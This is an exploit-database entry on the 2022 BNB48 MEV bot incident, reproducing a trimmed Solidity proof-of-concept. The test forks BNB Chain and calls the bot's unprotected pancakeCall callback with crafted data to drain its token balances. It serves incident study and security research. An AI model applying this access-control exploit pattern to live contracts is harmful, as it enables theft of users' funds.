# [?] MevBot private tx - Incorrect access control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BNB48MEVBot
Published: 2022-09-13
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/BNB48MEVBot_exp.sol
Type: defi-exploit-poc

## Details
Lost: $140 K

```solidity
contract ContractTest is Test {
    address public _token0;
    address public _token1;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    MEVBot Bot = MEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_297_409);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD balance before exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 18);

        uint256 USDTAmount = USDT.balanceOf(address(Bot));
        uint256 WBNBAmount = WBNB.balanceOf(address(Bot));
        uint256 BUSDAmount = BUSD.balanceOf(address(Bot));
        uint256 USDCAmount = USDC.balanceOf(address(Bot));

        (_token0, _token1) = (address(USDT), address(USDT));
        Bot.pancakeCall(
            address(this), USDTAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );
        (_token0, _token1) = (address(WBNB), address(WBNB));
        Bot.pancakeCall(
            address(this), WBNBAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );
        (_token0, _token1) = (address(BUSD), address(BUSD));
        Bot.pancakeCall(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/BNB48MEVBot_exp.sol_
